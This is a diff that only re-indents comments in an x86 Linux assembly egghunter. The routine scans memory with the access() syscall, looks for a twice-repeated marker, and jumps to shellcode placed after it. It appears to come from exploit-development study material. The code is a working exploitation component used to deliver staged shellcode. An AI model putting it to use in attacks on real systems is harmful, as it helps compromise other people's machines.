@@ -36,14 +36,14 @@ section .text
  
 _start:
 		xor ecx, ecx
-		mul ecx					; trick to clean ecx, eax, edx
-		cld   					; clear direction flag
+		mul ecx				; trick to clean ecx, eax, edx
+		cld   				; clear direction flag
  
 npage:
 		or dx, 0xfff			; add PAGE_SIZE to scan pointer, work in 0xffff boundaries (align page)
 
 nbyte:
-		inc edx					; increase scan pointer (memory address)
+		inc edx				; increase scan pointer (memory address)
 
 		; what's next? well, we'll check if the memory at the ptr is accessible
 		; 
@@ -57,9 +57,9 @@ nbyte:
 		; ... why twice the sig bytes? in order not to trigger on wrong data (see below)
 
 		push byte 0x21  		; syscall access()
-		pop eax                 ; load eax with 0x21 (syscall number)
+		pop eax                         ; load eax with 0x21 (syscall number)
 		lea ebx, [edx+4]		; we'll try to access edx+4 bytes (if that works, edx+0 will work, too!)
-								; ecx (mode) = 0
+						; ecx (mode) = 0
 		int 0x80
  
 		cmp al, 0xf2    		; check for error (EFAULT)
@@ -72,10 +72,10 @@ nbyte:
 		scasd
 		jnz nbyte   			; nope - increase ptr by 1 and try to read and scan again
 		scasd           		; scanning again (looking for a 2nd hit right after the 1st one)
-								; we do that twice in order to not trigger on the
-								; "mov eax, 0x90509050" bytecode but instead only
-								; trigger when reaching "the real egg" (tm)
+						; we do that twice in order to not trigger on the
+						; "mov eax, 0x90509050" bytecode but instead only
+						; trigger when reaching "the real egg" (tm)
 		jnz nbyte   			; no luck, increase ptr and try again
  
 		jmp edi         		; found egg twice, edi is now loaded with the address after
-								; the 2nd egg (where we'll put the shellcode)
+						; the 2nd egg (where we'll put the shellcode)
